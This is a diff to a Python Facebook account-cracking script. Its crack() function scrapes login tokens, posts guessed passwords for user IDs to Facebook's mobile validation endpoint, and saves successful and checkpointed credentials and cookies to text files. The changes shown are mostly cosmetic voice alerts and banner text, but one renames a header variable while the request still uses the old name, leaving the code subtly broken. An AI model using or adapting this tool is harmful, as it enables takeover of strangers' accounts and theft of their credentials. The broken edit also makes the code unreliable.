@@ -154,7 +154,9 @@ attemps = 0
 
 while attemps < 12345677901:
     username = input(' \033[0;92mEnter Username: ')
+    os.system('espeak -a 300 " tools, username, "')
     password = input(' \033[0;93mEnter Password: ')
+    os.system('espeak -a 300 " tools, password, "')
 
     if username == 'FIROZ' and password == 'MUBIN':
         print(' \033[0;92mLog in successfully brother.')
@@ -184,7 +186,7 @@ def banner():
    \033[1;93m╚═════╝ \033[1;97m╚═════╝ \033[1;92m╚═════╝ \033[1;94m╚═╝  ╚═╝\033[1;91m╚═╝  ╚═╝
 \033[0;36m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[1;97m
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[1;95m      [ WORKS ON WIFI AND MOBILE DATA ]      \033[1;97m║
+║\33[1;95m      [ WORKS ON ONLY WIFI MOBILE DATA ]     \033[1;97m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[0;36m 
 ╠══•>Author                  : FIROZ AHMED \033[0;36m   ║\033[1;33m 
@@ -497,12 +499,12 @@ def crack(idf,pwv):
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			header={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#COBRA-BOSS
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•COBRA-Cp] {idf} • {pw}')     
-				os.system('espeak -a 300 " Hey Boss, I have found, a, CP, ID"')
+				os.system('espeak -a 300 " mubin, CP, ID"')
 				open('/sdcard/COBRA-CP.txt','a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -514,7 +516,7 @@ def crack(idf,pwv):
 				#COBRA-BOSS
 				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•COBRA-Ok😘] {idf} • {pw}\n\033[0;93m[🇧🇩]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
-				os.system('espeak -a 300 " hello FIROZ, my boss! it′s a  Ok,  ID"')
+				os.system('espeak -a 300 "FIROZ, Ok, ID"')
 				open('/sdcard/COBRA-OK.txt', 'a').write( idf+' | '+pw+'\n'+'coki'+'\n')
 				cek_apk(session,coki)
 				break
